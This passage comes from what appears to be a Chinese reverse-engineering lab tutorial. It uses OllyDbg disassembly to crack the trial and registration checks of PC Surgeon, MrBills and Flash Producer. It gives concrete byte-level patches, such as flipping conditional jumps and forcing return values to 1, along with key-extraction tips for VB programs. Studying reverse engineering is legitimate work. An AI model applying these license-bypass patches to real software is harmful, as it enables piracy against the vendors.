ss:[ebp-0xC]\n005CC89D   . |BA BCCB5C00   mov edx,pcsurgeo.005CCBBC\n005CC8A2   . |E8 7587E3FF   call pcsurgeo.0040501C\n005CC8A7   . |68 02000080   push 0x80000002\n005CC8AC   . |6A 00         push 0x0\n005CC8AE   . |6A 00         push 0x0\n005CC8B0   . |B9 D4CB5C00   mov ecx,pcsurgeo.005CCBD4                ;  ASCII 53,\"oftware\\Dean Software\\PC Surgeon\"\n005CC8B5   . |B2 01         mov dl,0x1\n005CC8B7   . |A1 1CE94900   mov eax,dword ptr ds:[0x49E91C]\n005CC8BC   . |E8 BB2BEDFF   call pcsurgeo.0049F47C\n005CC8C1   . |8945 EC       mov dword ptr ss:[ebp-0x14],eax\n005CC8C4   . |33C0          xor eax,eax\n005CC8C6   . |55            push ebp\n005CC8C7   . |68 2EC95C00   push pcsurgeo.005CC92E\n005CC8CC   . |64:FF30       push dword ptr fs:[eax]\n005CC8CF   . |64:8920       mov dword ptr fs:[eax],esp\n005CC8D2   . |6A 00         push 0x0\n005CC8D4   . |8D45 E0       lea eax,dword ptr ss:[ebp-0x20]\n005CC8D7   . |50            push eax\n005CC8D8   . |B9 00CC5C00   mov ecx,pcsurgeo.005CCC00\n005CC8DD   . |BA 1CCC5C00   mov edx,pcsurgeo.005CCC1C\n005CC8E2   . |8B45 EC       mov eax,dword ptr ss:[ebp-0x14]          ;  gdi32.77BF820F\n005CC8E5   . |E8 122DEDFF   call pcsurgeo.0049F5FC\n005CC8EA   . |8B45 E0       mov eax,dword ptr ss:[ebp-0x20]          ;  usp10.74B0F772\n005CC8ED   . |8B55 F4       mov edx,dword ptr ss:[ebp-0xC]\n005CC8F0   . |E8 B78AE3FF   call pcsurgeo.004053AC\n005CC8F5   . |74 21         je short pcsurgeo.005CC918\n005CC8F7   . |8B55 FC       mov edx,dword ptr ss:[ebp-0x4]\n005CC8FA   . |8B45 FC       mov eax,dword ptr ss:[ebp-0x4]\n005CC8FD   . |E8 A2200300   call pcsurgeo.005FE9A4\n005CC902   . |8B45 F4       mov eax,dword ptr ss:[ebp-0xC]\n005CC905   . |50            push eax\n005CC906   . |BA 1CCC5C00   mov edx,pcsurgeo.005CCC1C\n005CC90B   . |B9 00CC5C00   mov ecx,pcsurgeo.005CCC00\n005CC910   . |8B45 EC       mov eax,dword ptr ss:[ebp-0x14]          ;  gdi32.77BF820F\n005CC913   . |E8 6430EDFF   call pcsurgeo.0049F97C\n005CC918   > |33C0          xor eax,eax\n005CC91A   . |5A            pop edx                                  ;  usp10.74B0F772\n005CC91B   . |59            pop ecx                                  ;  usp10.74B0F772\n005CC91C   . |59            pop ecx                                  ;  usp10.74B0F772\n005CC91D   . |64:8910       mov dword ptr fs:[eax],edx\n005CC920   . |68 42C95C00   push pcsurgeo.005CC942\n005CC925   > |8B45 EC       mov eax,dword ptr ss:[ebp-0x14]          ;  gdi32.77BF820F\n005CC928   . |E8 4377E3FF   call pcsurgeo.00404070\n005CC92D   . |C3            retn\n005CC92E   .^|E9 D17EE3FF   jmp pcsurgeo.00404804\n005CC933   .^|EB F0         jmp short pcsurgeo.005CC925\n005CC935   > \\BA 30CA5C00   mov edx,pcsurgeo.005CCA30                ;  ASCII \"PC Surgeon\"\n```\n\n看到上面指令的第2条就是要找的字符串，下面还有“days remaining..”的字样，不难猜测两条注释中间的指令就是计算倒数的指令。往上看可以看到条件跳转指令。经过这么多次实验，条件跳转指令的重要性不必再说了吧。如果跳转实现，就会跳到CC935地址，绕过计算倒数指令。\n\n先尝试一下，在跳转指令下个断点，重载程序，运行，将Z标志位改为0，跳转，F9运行到程序，发现图1的NAG窗口绕过了，直接进到界面，界面的标题也没有了“<unregistered ... days remaining..”字样。说明跳过的指令还包含了NAG窗口。现在来打补丁，打完保存数据到文件。(也可以跟下面步骤一起打完再保存，但我太傻了还是修改一个保存一个吧)\n\n```asm\njnz pcsurgeo.005CC935\t\t=>\t\tjz pcsurgeo.005CC935\n```\n\n载入新程序，没问题。但是图3还是显示未注册，说明破解还不完全。同样的方法查找字符串，不能用实验五查找字符串的方法的原因是就算改了字符串，但`Use Reg Key`还在，也还是未完全破解。\n\n```asm\n00562466   . /75 22         jnz short pcsurgeo.0056248A\n00562468   . |8B83 08030000 mov eax,dword ptr ds:[ebx+0x308]\n0056246E   . |B2 01         mov dl,0x1\n00562470   . |E8 1F78F1FF   call pcsurgeo.00479C94\n00562475   . |8B83 24030000 mov eax,dword ptr ds:[ebx+0x324]\n0056247B   . |BA B8265600   mov edx,pcsurgeo.005626B8                ;  ASCII \"<Unregistered Version>\"\n00562480   . |E8 1F79F1FF   call pcsurgeo.00479DA4\n00562485   . |E9 E0010000   jmp pcsurgeo.0056266A\n0056248A   > \\8B83 08030000 mov eax,dword ptr ds:[ebx+0x308]\n```\n\n字符串的上面也有一个跳转指令，如果跳转实现跳到248A地址，绕过字符串。同样的方法尝试一下。跳转指令下断点，重载运行，界面help->about，没有弹出窗口，OD停到断点处，将Z标志位改为0，运行程序，弹出已注册窗口。\n\n{% asset_img 实验7.3.png 实验7.3 %}\n\n说明我们改对了，现在去打补丁。\n\n```asm\njnz short pcsurgeo.0056248A\t\t=>\t\tjz short pcsurgeo.0056248A\n```\n\n保存数据到文件，破解实现。\n\n### 14.2 根据代码逻辑破解\n\n这个程序比较简单，所以修改几条跳转指令足以实现破解。但很多程序都是比较大型的，未注册到注册可能经过层层验证，可能需要修改很多条跳转指令。如果不想修改跳转指令，那就需要了解代码的内部逻辑。\n\n同样，通过查找字符串去到`<unregistered`汇编代码处。往上找最近的call指令，下断点，重载运行，分析代码逻辑。\n\n```asm\n005CC81B   .  E8 9C5FEDFF   call pcsurgeo.004A27BC\n005CC820   .  A1 8CEB6000   mov eax,dword ptr ds:[0x60EB8C]\n;函数返回值存到eax里，在信息窗口可以看到eax=ds:[0x60EB8C]=610c4a\n005CC825   .  8038 00       cmp byte ptr ds:[eax],0x0\n;函数返回值与0对比(相减),ds:[eax]=00\n005CC828   .  0F85 07010000 jnz pcsurgeo.005CC935;相减为0，不跳过\n005CC82E   .  A1 DCF16000   mov eax,dword ptr ds:[0x60F1DC]\n;eax=ds:[0x60F1DC]=610c5e\n005CC833   .  8038 00       cmp byte ptr ds:[eax],0x0;ds:[eax]=00\n005CC836      0F85 F9000000 jnz pcsurgeo.005CC935;相减为0，不跳过\n;为什么有两个判断？判断是否注册，未注册的话判断还剩几天\n005CC83C   .  68 70CB5C00   push pcsurgeo.005CCB70                   ;  ASCII 50,\"C Surgeon <unregistered - \"\n005CC841   .  D905 3CCA5C00 fld dword ptr ds:[0x5CCA3C]\n; fld浮点指令，相当于push，ds:[0x5CCA3C]=15.00000\n005CC847   .  A1 8CEC6000   mov eax,dword ptr ds:[0x60EC8C]\n;eax=ds:[0x60EC8C]=610c54\n005CC84C   .  DC20          fsub qword ptr ds:[eax]\n;fsub相当于sub，st=15.00000,ds:[eax]=10.00000\n;未注册的用户可以使用15天，ds:[eax]=ds:[0x610c54]=10存的是经过的天数\n005CC84E   .  83C4 F4       add esp,-0xC\n005CC851   .  DB3C24        fstp tbyte ptr ss:[esp];st=5,剩余的天数\n005CC854   .  9B            wait\n005CC855   .  8D55 E4       lea edx,dword ptr ss:[ebp-0x1C]\n005CC858   .  B8 94CB5C00   mov eax,pcsurgeo.005CCB94                ;  UNICODE \"0\"\n005CC85D   .  E8 42FAE3FF   call pcsurgeo.0040C2A4\n005CC862   .  FF75 E4       push dword ptr ss:[ebp-0x1C];将剩余的天数入栈\n005CC865   .  68 A0CB5C00   push pcsurgeo.005CCBA0                   ;  ASCII 20,\"days remaining..>\"\n```\n\n分析得很清晰了，我们要绕过的话就饶过call函数后面的第一次跳转，等等！这不是跟暴力破解一样吗？！当然我们不是这么做。(虚晃一枪)\n\n题外话：选中汇编代码如`mov eax,dword ptr ds:[0x60EB8C]`，信息窗口会显示`ds:[0x60EB8C]=00610c4a`，在信息窗口中选中，右键->数据窗口中跟随数值，就可在数据窗口中看到610c4a的值。\n\n已知call指令结束，60eb8c地址存的东西要赋值给eax，eax通常存的是返回值或返回值的指针，所以不管怎样，死抓60eb8c就对了！选中汇编代码右键->查找参考->地址常量，弹出R图标，里面是整个程序所有用到60eb8c地址的汇编代码。我们现在要找初始化60eb8c地址的地址，因为那个地址是判断注册与未注册的分叉点。右键->在每个命令上设置断点。重载，运行，停在了第一个断点处，也就是程序初始化60eb8c地址处。\n\n```asm\n005C2BF6   .  8B15 8CEB6000 mov edx,dword ptr ds:[0x60EB8C]          ;  pcsurgeo.00610C4A\n;ecx=ds:[0x60EB8C]=610c4a\n005C2BFC   .  8802          mov byte ptr ds:[edx],al\n;将al赋值给610c4a，al=00,ds:[610c4a]=00\n005C2BFE   .  A1 8CEB6000   mov eax,dword ptr ds:[0x60EB8C]\n;ds:[0060eb8c]=00610c4a\n005C2C03   .  8038 00       cmp byte ptr ds:[eax],0x0;将ds:[eax]与0比较\n005C2C06   .  75 0D         jnz short pcsurgeo.005C2C15;相减为0不跳转\n005C2C08   .  E8 6307EEFF   call pcsurgeo.004A3370\n005C2C0D   .  A1 8CEC6000   mov eax,dword ptr ds:[0x60EC8C]\n005C2C12   .  DD18          fstp qword ptr ds:[eax]\n005C2C14   .  9B            wait\n005C2C15   >  8D45 9C       lea eax,dword ptr ss:[ebp-0x64]\n```\n\n其中两种改法：\n\n```asm\nmov byte ptr ds:[edx],al\t=>\t\tmov byte ptr ds:[edx],1\n```\n\n{% asset_img 实验7.4.png 实验7.4 %}\n\n上面这种改法需要重定位，可能不太安全，那可以用下面这种改法。\n\n```asm\ncmp byte ptr ds:[eax],0x0\t=>\t\tmov byte ptr ds:[eax],1\njnz short pcsurgeo.005C2C15\t=>\t\tjmp short pcsurgeo.005C2C15\n```\n\n保存后重载运行，整个程序就处于注册阶段了，不需要一次次修改跳转指令。\n\n## 15. 实验八 MrBills\n\n{% asset_img 实验8.png 实验8 %}\n\n{% asset_img 实验8.1.png 实验8.1 %}\n\n{% asset_img 实验8.2.png 实验8.2 %}\n\n目标：破解注册。\n\n想要定位到`You have entered`字符串，右键->中文搜索引擎->智能搜索，找到双击去到反汇编窗口。\n\n```asm\n004299B9   . /75 36         jnz short MrBills.004299F1\n004299BB   . |6A 30         push 0x30\n004299BD   . |68 70134C00   push MrBills.004C1370                    ;  You have entered an invalid email address or license number.  Please try again.\n004299C2   . |E8 74270800   call MrBills.004AC13B\n004299C7   . |8D8E 20010000 lea ecx,dword ptr ds:[esi+0x120]\n004299CD   . |E8 567CFDFF   call MrBills.00401628\n004299D2   . |8BCF          mov ecx,edi                              ;  MrBills.<ModuleEntryPoint>\n004299D4   . |E8 4F7CFDFF   call MrBills.00401628\n004299D9   . |53            push ebx\n004299DA   . |8BCE          mov ecx,esi                              ;  MrBills.<ModuleEntryPoint>\n004299DC   . |E8 D5A60700   call MrBills.004A40B6\n004299E1   . |8D8E 7C010000 lea ecx,dword ptr ds:[esi+0x17C]\n004299E7   . |E8 83D00700   call MrBills.004A6A6F\n004299EC   . |E9 29010000   jmp MrBills.00429B1A\n004299F1   > \\6A 40         push 0x40\n004299F3   .  68 50134C00   push MrBills.004C1350                    ;  Thank you for registering!\n```\n\n找到上面最近的跳转指令，跳转指令未实现，若实现则跳过未注册弹窗，去到`Thank you for registering!`，不知道自己的推测对不对的话就先改标志位，因为标志位在重载程序不会被保存，错了重载程序即可。\n\n{% asset_img 实验8.3.png 实验8.3 %}\n\n貌似没有问题，现在就来打补丁吧。\n\n```asm\njnz short MrBills.004299F1\t\t=>\t\tjmp short MrBills.004299F1\n```\n\n运行程序，注册后界面标题的未注册提示也已经没了。但每次启动都要注册显然很麻烦，而且真正的注册成功后`Register...`是变灰色的，而且会弹窗提示，所以这个并没有注册成功。因为如果这样打补丁的话，相当于注册与其他功能分隔开了。\n\n我们找是找对了，但要进一步追踪实现跳转的条件。jnz的意思是如果Z标志位非0则跳转，为0则不跳转。哪条指令改变了Z标志位？往上找，看到test指令，test指令是进行按位与运算，值为0在Z标志位置1，非0置0。\n\n```asm\n004299B5   .  84C0          test al,al\t\t\t\t\t\t;非0注册\n004299B7   .  59            pop ecx                                  ;  kernel32.7716FA29\n004299B8   .  53            push ebx\n004299B9      75 36         jnz short MrBills.004299F1               ;  要实现跳转\n```\n\n是什么改变了al的值？再往上找。call指令的返回值存放在eax中，所以call指令会影响al的值。要进入这个call函数了解内部逻辑。注释标志1为第一个进入的函数，因为可能接下来要进入很多个函数，很乱，像走迷宫一样，所以标志数字说明你走过，走的是哪个函数。\n\n```asm\n004299AD   .  E8 9AD7FDFF   call MrBills.0040714C\t\t\t\t;需进入1\n004299B2   .  59            pop ecx                                  ;  kernel32.7716FA29\n004299B3   .  33DB          xor ebx,ebx\n004299B5   .  84C0          test al,al\t\t\t\t\t\t\t;非0注册\n004299B7   .  59            pop ecx                                  ;  kernel32.7716FA29\n004299B8   .  53            push ebx\n004299B9      75 36         jnz short MrBills.004299F1               ;  要实现跳转\n```\n\n在call指令下断点，重载运行。输入邮箱和证书运行到断点位置。进入函数1，里面还有很多个函数，先看第1个把它注释为“需进入2”，下面函数还需不需要进入要看第1个函数下面的跳转指令会不会跳过下面的函数。先不要进入第1个函数，F8往下走走。\n\n```asm\n0040714C   $  55            push ebp\n0040714D   .  8BEC          mov ebp,esp\n0040714F   .  FF75 0C       push dword ptr ss:[ebp+0xC]\n00407152   .  FF75 08       push dword ptr ss:[ebp+0x8]              ;  MrBills.004C1014\n00407155   .  E8 77FEFFFF   call MrBills.00406FD1\t\t\t\t;需进入2\n0040715A   .  84C0          test al,al\t\t\t\t\t\t\t;al=00,Z=1\n0040715C   .  59            pop ecx                                  ;  MrBills.004299B2\n0040715D   .  59            pop ecx                                  ;  MrBills.004299B2\n0040715E   .  A2 A0765000   mov byte ptr ds:[0x5076A0],al\n00407163   .  75 1B         jnz short MrBills.00407180\t\t\t;跳转未实现\n00407165   .  FF75 0C       push dword ptr ss:[ebp+0xC]\n00407168   .  FF75 08       push dword ptr ss:[ebp+0x8]              ;  MrBills.004C1014\n0040716B   .  E8 ADFEFFFF   call MrBills.0040701D\t\t\t\t;需进入3\n00407170   .  84C0          test al,al\t\t\t\t\t\t\t;al=00,Z=1\n00407172   .  59            pop ecx                                  ;  MrBills.004299B2\n00407173   .  59            pop ecx                                  ;  MrBills.004299B2\n00407174   .  A2 A0765000   mov byte ptr ds:[0x5076A0],al\n00407179   .  A2 A2765000   mov byte ptr ds:[0x5076A2],al\n0040717E   .  74 0D         je short MrBills.0040718D\t\t\t;跳转实现\n00407180   >  FF75 0C       push dword ptr ss:[ebp+0xC]\n00407183   .  FF75 08       push dword ptr ss:[ebp+0x8]\n00407186   .  E8 45F8FFFF   call MrBills.004069D0\t\t\t\t;被跳过，无需理会\n0040718B   .  59            pop ecx                                  ;  00199DEC\n0040718C   .  59            pop ecx                                  ;  00199DEC\n0040718D   >  5D            pop ebp                                  ;  00199DEC\n0040718E   .^ E9 D6FEFFFF   jmp MrBills.00407069\t\n;跳到上面执行，eax存的是地址，不管，最后返回到函数1\n```\n\n函数1的整体逻辑弄懂了，现在继续看函数2。\n\n```asm\n00406FD1  /$  B8 AB374B00   mov eax,MrBills.004B37AB\n00406FD6  |.  E8 EDF00700   call MrBills.004860C8;经过这条指令，eax存的是地址，不是返回值\n00406FDB  |.  51            push ecx\n00406FDC  |.  53            push ebx\n00406FDD  |.  FF35 A4415000 push dword ptr ds:[0x5041A4]             ;  ORUWOZ3FOI\n00406FE3  |.  8D4D F0       lea ecx,[local.4]\n00406FE6  |.  E8 84B1FFFF   call MrBills.0040216F;同上不是\n00406FEB  |.  FF75 0C       push [arg.2]\n00406FEE  |.  8365 FC 00    and [local.1],0x0\n00406FF2  |.  FF75 08       push [arg.1]\n00406FF5  |.  8D45 F0       lea eax,[local.4]\n00406FF8  |.  50            push eax\n00406FF9  |.  E8 4DFFFFFF   call MrBills.00406F4B;经过这条指令，al=00,需进入4\n00406FFE  |.  8B4D F0       mov ecx,[local.4]\n00407001  |.  83C4 0C       add esp,0xC\n00407004  |.  83C1 F0       add ecx,-0x10\n00407007  |.  8AD8          mov bl,al;用bl存放al的值\n00407009  |.  E8 3AA1FFFF   call MrBills.00401148\n0040700E  |.  8B4D F4       mov ecx,[local.3]\n00407011  |.  8AC3          mov al,bl;用al存放bl的值\n;al给bl，bl又给回al，中间有call指令，涉及两种情况：①保护现场，②传参。在这里猜测bl暂存al的值，中间的call指令要用到al，等call指令用完al，bl把值还给al。起到保护现场作用。也可以推测在call指令前al存的就很有可能是注册或未注册的返回值，所以al=00那个call指令是一定要进入的(需进入4)\n00407013  |.  5B            pop ebx                                  ;  00199D98\n00407014  |.  64:890D 00000>mov dword ptr fs:[0],ecx\n0040701B  |.  C9            leave\n0040701C  \\.  C3            retn;退出函数2\n```\n\n如果不确定要不要进入某个函数，可以按回车查看函数内部代码，但并不执行。想进去就按F7，不想进去就按F8。\n\n进入函数4：\n\n```asm\n00406F4B  /$  B8 E9374B00   mov eax,MrBills.004B37E9\n00406F50  |.  E8 73F10700   call MrBills.004860C8\n00406F55  |.  51            push ecx\n00406F56  |.  8B45 08       mov eax,[arg.1]\n00406F59  |.  53            push ebx\n00406F5A  |.  56            push esi                                 ;  MrBills.00507738\n00406F5B  |.  FF30          push dword ptr ds:[eax]\n00406F5D  |.  8D45 08       lea eax,[arg.1]\n00406F60  |.  50            push eax\n00406F61  |.  E8 38FBFFFF   call MrBills.00406A9E\n00406F66  |.  8B45 0C       mov eax,[arg.2]\n00406F69  |.  FF30          push dword ptr ds:[eax]\n00406F6B  |.  8365 FC 00    and [local.1],0x0\n00406F6F  |.  8D45 F0       lea eax,[local.4]\n00406F72  |.  50            push eax\n00406F73  |.  E8 26FBFFFF   call MrBills.00406A9E\n00406F78  |.  FF75 10       push [arg.3]\n00406F7B  |.  C645 FC 01    mov byte ptr ss:[ebp-0x4],0x1\n00406F7F  |.  50            push eax\n00406F80  |.  8D45 08       lea eax,[arg.1]\n00406F83  |.  50            push eax\n00406F84  |.  8D45 0C       lea eax,[arg.2]\n00406F87  |.  50            push eax\n00406F88  |.  E8 89FDFFFF   call MrBills.00406D16\n00406F8D  |.  FF30          push dword ptr ds:[eax]\n00406F8F  |.  8B75 08       mov esi,[arg.1]\n00406F92  |.  56            push esi                                 ;  MrBills.00507738\n00406F93  |.  E8 4FF10700   call MrBills.004860E7\n00406F98  |.  8B4D 0C       mov ecx,[arg.2];al=01,bl=00\n00406F9B  |.  83C4 28       add esp,0x28\n00406F9E  |.  8BD8          mov ebx,eax\n00406FA0  |.  F7DB          neg ebx\n00406FA2  |.  1ADB          sbb bl,bl\n00406FA4  |.  83C1 F0       add ecx,-0x10\n00406FA7  |.  FEC3          inc bl\n00406FA9  |.  E8 9AA1FFFF   call MrBills.00401148\n00406FAE  |.  8B4D F0       mov ecx,[local.4]\n00406FB1  |.  83C1 F0       add ecx,-0x10\n00406FB4  |.  E8 8FA1FFFF   call MrBills.00401148\n00406FB9  |.  8D4E F0       lea ecx,dword ptr ds:[esi-0x10]\n00406FBC  |.  E8 87A1FFFF   call MrBills.00401148\n00406FC1  |.  8B4D F4       mov ecx,[local.3]\n00406FC4  |.  5E            pop esi                                  ;  MrBills.00406FFE\n00406FC5  |.  8AC3          mov al,bl\n00406FC7  |.  5B            pop ebx      ;al=00,bl=00                            ;  MrBills.00406FFE\n00406FC8  |.  64:890D 00000>mov dword ptr fs:[0],ecx\n00406FCF  |.  C9            leave\n00406FD0  \\.  C3            retn\n```\n\n所以在这个决定al的值的函数4，是通过改变bl间接赋给al返回值。\n\n函数4和函数2执行完，接下来执行的是函数3。\n\n```asm\n0040701D  /$  B8 AB374B00   mov eax,MrBills.004B37AB\n00407022  |.  E8 A1F00700   call MrBills.004860C8\n00407027  |.  51            push ecx\n00407028  |.  53            push ebx\n00407029  |.  FF35 A0415000 push dword ptr ds:[0x5041A0]             ;  OBZG65DJM4\n0040702F  |.  8D4D F0       lea ecx,[local.4]\n00407032  |.  E8 38B1FFFF   call MrBills.0040216F\n00407037  |.  FF75 0C       push [arg.2]\n0040703A  |.  8365 FC 00    and [local.1],0x0\n0040703E  |.  FF75 08       push [arg.1]\n00407041  |.  8D45 F0       lea eax,[local.4]\n00407044  |.  50            push eax\n00407045  |.  E8 01FFFFFF   call MrBills.00406F4B;这个也是函数4\n;有没有觉得似曾相识？接下来的代码跟函数2的代码一模一样，表明它们用的算法思路是一样的，或者加强检验\n0040704A  |.  8B4D F0       mov ecx,[local.4]\n0040704D  |.  83C4 0C       add esp,0xC\n00407050  |.  83C1 F0       add ecx,-0x10\n00407053  |.  8AD8          mov bl,al\n00407055  |.  E8 EEA0FFFF   call MrBills.00401148\n0040705A  |.  8B4D F4       mov ecx,[local.3]                        ;  MrBills.00407170\n0040705D  |.  8AC3          mov al,bl\n0040705F  |.  5B            pop ebx                                  ;  MrBills.00407170\n00407060  |.  64:890D 00000>mov dword ptr fs:[0],ecx\n00407067  |.  C9            leave\n00407068  \\.  C3            retn\n```\n\n弄明白逻辑，现在来修改函数。先修改函数2，不行再修改函数3(如果是加强检验)。\n\n进入函数1->进入函数2->进入函数4，找到关键点，也就是bl赋值给al的指令\n\n```asm\n00406FC4  |.  5E            pop esi                                  ;  MrBills.00406FFE\n00406FC5  |.  8AC3          mov al,bl\n00406FC7  |.  5B            pop ebx      ;al=00,bl=00                            ;  MrBills.00406FFE\n```\n\n```asm\nmov al,bl\t\t\t=>\t\t\tmov al,1\n```\n\n运行，这样才算是成功了。\n\n{% asset_img 实验8.4.png 实验8.4 %}\n\n{% asset_img 实验8.5.png 实验8.5 %}\n\n## 16. 针对性逆向\n\n掌握不同编译器编译出来的程序的特点，然后才能有针对性地进行逆向。\n\n查壳工具：exeinfope.exe\n\n### 16.1 Visual BASIC(实验九)\n\nVB是由早期DOS时代的BASIC语言发展而来的可视化编程语言。VB是由事件驱动的编程语言。VB语言用的是Unicode编码。\n\n所有的VB程序几乎都是依赖于一个外部的动态链接库`MSVBVM60.dll`。正是因为VB中所有的API函数都在dll中去实现，所以导致在跟踪程序的执行代码时频繁地在dll领空和程序领空横跳。正因为如此，VB程序很难在函数内修改返回值，而且没有`MessageBox`函数，它的弹窗是`tcMsgBox`函数。\n\n#### 16.1.1 VB破解的关键\n\n| 针对变量           | 针对字符串             |\n| ------------------ | ---------------------- |\n| **__vbaVarTstEq**  | **__vbaStrCmp**        |\n| __vbaVarTstNe      | __vbaStrComp           |\n| **__vbaVarCompEq** | __vbaStrCompVar        |\n| __vbaVarCompLe     | __vbaStrLike           |\n| __vbaVarCompLt     | __vbaStrTextComp       |\n| __vbaVarCompGe     | __vbaStrTextLike       |\n| __vbaVarCompGt     |                        |\n| __vbaVarCompNe     | 加粗都是比较常用的函数 |\n\n在一个VB写成的程序中需要注册码，如何破解？VB程序在装载时会结合硬件信息生成一个独一无二的Key(注册码)。在OD中载入程序，Ctrl+N打开输入输出表(N图标)，直接输入需要查找的函数，在标题处会显示输入的字母，选中函数右键->在每个参考上设置断点。重载运行，停到断点处后F8单步步过，如果整个程序走完了还没看到Key，那就换一个函数继续找。它的Key就在注释窗口处，很容易被找到。\n\n就算把程序卸载后重装，它还是已经注册好了。\n\n### 16.2 Delphi(实验十)\n\n非常多的call指令。\n\n```asm\npush 004A52F4\n……\nretn\t\t\t\t\t;相当于jmp 004A52F4\n```\n\n`-`返回上一条指令查看，但程序已经执行到下面一条指令了。\n\n## 17. 实验九 Flash Producer\n\n{% asset_img 实验9.png 实验9 %}\n\n{% asset_img 实验9.1.png 实验9.1 %}\n\n目标：破解程序。\n\n{% asset_img 实验9.1.png 实验9.1 %}\n\n既然认识了查壳工具，那就用用它吧。可以知道它是32位exe文件，用C++编译，无壳。\n\n载入OD，在注册时弹窗“Invalid Password”，试试搜索字符串。右键->中文搜索引擎->智能搜索，查找字符串，定位到反汇编窗口。\n\n```asm\n00404851   .  68 34034300   push fjproduc.00430334                   ;  v5le0n9\n;push用户输入的password，接下来的函数就是判断password对错\n00404856   .  E8 E5FDFFFF   call fjproduc.00404640\n0040485B   .  83C4 04       add esp,0x4;al=00\n0040485E   .  84C0          test al,al;按位与为0时Z置1，非0置0\n00404860   .  74 35         je short fjproduc.00404897;相等跳转，与jz用法相同。Z为1跳转\n00404862   .  8B0D ACE34200 mov ecx,dword ptr ds:[0x42E3AC]          ;  Password\n00404868   .  68 60034300   push fjproduc.00430360                   ; /FileName = \"\"\n0040486D   .  68 34034300   push fjproduc.00430334                   ; |String = \"\"\n00404872   .  51            push ecx                                 ; |Key = \"j`h犬B\"\n00404873   .  68 149D4200   push fjproduc.00429D14                   ; |Registration\n00404878   .  FF15 28904200 call dword ptr ds:[<&KERNEL32.WritePriva>; \\WritePrivateProfileStringA\n0040487E   .  6A 01         push 0x1\n00404880   .  E8 5BFEFFFF   call fjproduc.004046E0\n00404885   .  83C4 04       add esp,0x4\n00404888   >  6A 01         push 0x1                                 ; /Result = 0x1\n0040488A   .  56            push esi                                 ; |hWnd = 004203BB\n0040488B   .  FF15 2C924200 call dword ptr ds:[<&USER32.EndDialog>]  ; \\EndDialog\n00404891   .  33C0          xor eax,eax\n00404893   .  5E            pop esi                                  ;  kernel32.74F60419\n00404894   .  C2 1000       retn 0x10\n00404897   >  6A 30         push 0x30                                ; /Style = MB_OK|MB_ICONEXCLAMATION|MB_APPLMODAL\n00404899   .  68 A49B4200   push fjproduc.00429BA4                   ; |Error\n0040489E   .  68 409D4200   push fjproduc.00429D40                   ; |Invalid Password\n004048A3   .  56            push esi                                 ; |hOwner = 004203BB\n004048A4   .  FF15 48924200 call dword ptr ds:[<&USER32.MessageBoxA>>; \\MessageBoxA\n```\n\n可以看到4897地址有一个被指向符号，是从4860地址的跳转指令跳过来的。跳转指令上方有个调用指令，有个改变Z标志位的test指令。在call指令处下断点，进入到被调用函数。\n\n```asm\n00404640  /$  83EC 2C       sub esp,0x2C\n00404643  |.  56            push esi                                 ;  fjproduc.00430334\n00404644  |.  8B7424 34     mov esi,dword ptr ss:[esp+0x34]          ;  fjproduc.00430334\n00404648  |.  8BC6          mov eax,esi                              ;  fjproduc.00430334\teax=v5le0n9\n0040464A  |.  8D50 01       lea edx,dword ptr ds:[eax+0x1];edx=5le0n9\n;lea指令用于把源操作数的地址偏移量传送目的操作数\n0040464D  |.  8D49 00       lea ecx,dword ptr ds:[ecx]\n00404650  |>  8A08          /mov cl,byte ptr ds:[eax];将v赋值到cl\n00404652  |.  40            |inc eax                                 ;  fjproduc.00430334\teax指向5\n00404653  |.  84C9          |test cl,cl;按位与cl\n00404655  |.^ 75 F9         \\jnz short fjproduc.00404650;eax不为空则跳转\n00404657  |.  2BC2          sub eax,edx\n00404659  |.  83F8 04       cmp eax,0x4;eax长度与4对比\n0040465C  |.  73 07         jnb short fjproduc.00404665\n;jump if not below 如果eax长度不小于4则跳转(password要4个字符以上)\n0040465E  |>  32C0          xor al,al;al=00\n;从下面的jnz跳到这里，往下执行退出函数，一种改法：xor al,al\t=>\tmov al,1\n;类似于if(xxx) return 1;else return 1;\n00404660  |.  5E            pop esi                                  ;  fjproduc.00430334\n00404661  |.  83C4 2C       add esp,0x2C\n00404664  |.  C3            retn\n00404665  |>  6A 03         push 0x3\n00404667  |.  68 C49C4200   push fjproduc.00429CC4                   ;  fjr\n0040466C  |.  56            push esi                                 ;  fjproduc.00430334  esi指向v5le0n9\n0040466D  |.  E8 6EAA0100   call fjproduc.0041F0E0\n;猜测上面操作只是为了要求password在4个字符以上，这个函数才是判断password是否有效的一部分\n;上面3个push是为调用函数传参\n;结合下面468B地址中esi=e0n9,可知这个函数用了前三个v5l与fjr比较，也就是说password必须以fjr为前缀\n00404672  |.  83C4 0C       add esp,0xC;al=01\n00404675  |.  85C0          test eax,eax                             ;  fjproduc.00430334\n00404677  |.^ 75 E5         jnz short fjproduc.0040465E\n;jump if not zero 按位与不为0则跳转退出函数;先修改这里让它往下走\n00404679  |.  68 B8E04200   push fjproduc.0042E0B8                   ;  0123456789abcdefghijklmnopqrstuvwxyz\n;这个奇奇怪怪又有规律的字符串一定有猫腻\n0040467E  |.  8D4424 08     lea eax,dword ptr ss:[esp+0x8]\n00404682  |.  50            push eax                                 ;  fjproduc.00430334\n00404683  |.  8D4C24 10     lea ecx,dword ptr ss:[esp+0x10]\n00404687  |.  51            push ecx                                 ;  user32.76DE97B6\n00404688  |.  83C6 03       add esi,0x3\n0040468B  |.  56            push esi                                 ;  fjproduc.00430334\tesi=e0n9\n0040468C  |.  E8 7FE40000   call fjproduc.00412B10\n;传了4个参数给2B10函数，其中包括用户输入的password,所以这个函数也是判断password的一部分\n00404691  |.  8B4424 14     mov eax,dword ptr ss:[esp+0x14];eax=03\n00404695  |.  83C4 10       add esp,0x10\n00404698  |.  83F8 08       cmp eax,0x8\n0040469B  |.^ 7C C1         jl short fjproduc.0040465E;eax小于8跳转，退出函数\n;ZF=0,且SF⊕OF=1，这里不让它跳，所以修改SF或OF\n0040469D  |.  68 0C034300   push fjproduc.0043030C                   ;  ASCII \"-1568272844\"\n004046A2  |.  E8 F9E20000   call fjproduc.004129A0\n004046A7  |.  83C4 04       add esp,0x4;eax=0b\tesp存的是v5le0n9(长度为7)\n004046AA  |.  33F6          xor esi,esi                              ;  fjproduc.00430334\n004046AC  |.  8D6424 00     lea esp,dword ptr ss:[esp]\n;edx=1568272844\n004046B0  |>  33D2          /xor edx,edx;edx=0\n004046B2  |.  8A5434 08     |mov dl,byte ptr ss:[esp+esi+0x8]\n004046B6  |.  52            |push edx;edx=c5\n004046B7  |.  E8 84E30000   |call fjproduc.00412A40\n004046BC  |.  83C4 04       |add esp,0x4\n004046BF  |.  884434 08     |mov byte ptr 